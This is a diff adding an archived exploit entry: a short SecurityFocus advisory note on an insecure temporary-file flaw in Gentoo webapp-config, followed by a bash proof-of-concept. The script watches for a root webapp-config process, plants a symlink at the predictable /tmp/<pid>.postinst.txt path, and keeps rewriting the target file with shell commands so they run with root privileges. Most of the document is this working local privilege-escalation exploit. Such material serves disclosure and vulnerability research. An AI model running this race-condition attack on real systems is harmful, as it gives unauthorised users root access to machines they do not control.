@@ -1,0 +1,52 @@
+source: http://www.securityfocus.com/bid/13780/info
+
+Gentoo webapp-config is prone to an insecure file creation vulnerability. This issue is due to a design error that causes the application to fail to verify the existence of a file before writing to it.
+
+An attacker may leverage this issue to cause arbitrary shell commands to be executed with superuser privileges. 
+
+#!/bin/bash
+
+# Eric Romang aka wow (eromang@zataz.net)
+# webapp-config race condition how permit execution of arbitrary command with root privileges
+# work with < webapp-config 1.10-r14
+
+rm -f webapp-config_trace.txt fake_tmp_file /tmp/*.postinst.txt
+touch ~/fake_tmp_file
+
+echo "0" > webapp-config_trace.txt
+status=`cat webapp-config_trace.txt`
+echo "Waiting for webapp-config execution..."
+
+while [ "$status" == 0 ]
+do
+	ps auxw|grep webapp-config|grep root 
+	if [ "$?" == 0 ]
+	then
+		echo "1" > webapp-config_trace.txt
+	fi
+	status=`cat webapp-config_trace.txt`
+done
+
+echo "Process caught !"
+process_id=`pgrep -u root webapp-config`
+ln -s ~/fake_tmp_file /tmp/$process_id.postinst.txt
+echo "fake_file_created!"
+echo "we force the file to be overwritten"
+
+echo "0" > webapp-config_trace.txt
+status=`cat webapp-config_trace.txt`
+echo "Waiting the end of webapp-config"
+echo "during all the configuration we force the file to be overwritten"
+while [ "$status" == 0 ]
+do
+	ps auxw|grep webapp-config|grep root
+	if [ "$?" == 1 ]
+	then
+		echo "1" > webapp-config_trace.txt
+	else
+		echo "echo premature end of script; exit 1;" > ~/fake_tmp_file
+	fi
+	status=`cat webapp-config_trace.txt`
+done
+echo "end of webapp-config"
+
